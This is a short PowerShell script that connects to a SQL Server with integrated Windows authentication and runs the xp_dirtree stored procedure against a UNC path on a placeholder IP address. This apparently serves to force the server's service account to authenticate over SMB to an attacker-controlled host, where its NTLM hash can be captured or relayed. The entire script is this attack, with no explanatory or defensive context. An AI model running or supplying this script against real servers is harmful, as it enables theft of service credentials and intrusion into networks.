$ServerInstance = "sql.web.site "
$Database = "master "
$ConnectionTimeout = 30
$Query = "EXEC master..xp_dirtree \"\\\\x.x.x.x\\\\fake\";"
$QueryTimeout = 120

$conn=new-object System.Data.SqlClient.SQLConnection
$ConnectionString = "Server={0};Database={1};Integrated Security=True;Connect Timeout={2}" -f $ServerInstance,$Database,$ConnectionTimeout
$conn.ConnectionString=$ConnectionString
try{
    $conn.Open()
    Write-Output "Success"
}
catch{
    throw "Fail"
}
$cmd=new-object system.Data.SqlClient.SqlCommand($Query,$conn)
$cmd.CommandTimeout=$QueryTimeout
$ds=New-Object system.Data.DataSet
$da=New-Object system.Data.SqlClient.SqlDataAdapter($cmd)
[void]$da.fill($ds)
$conn.Close()
$ds.Tables
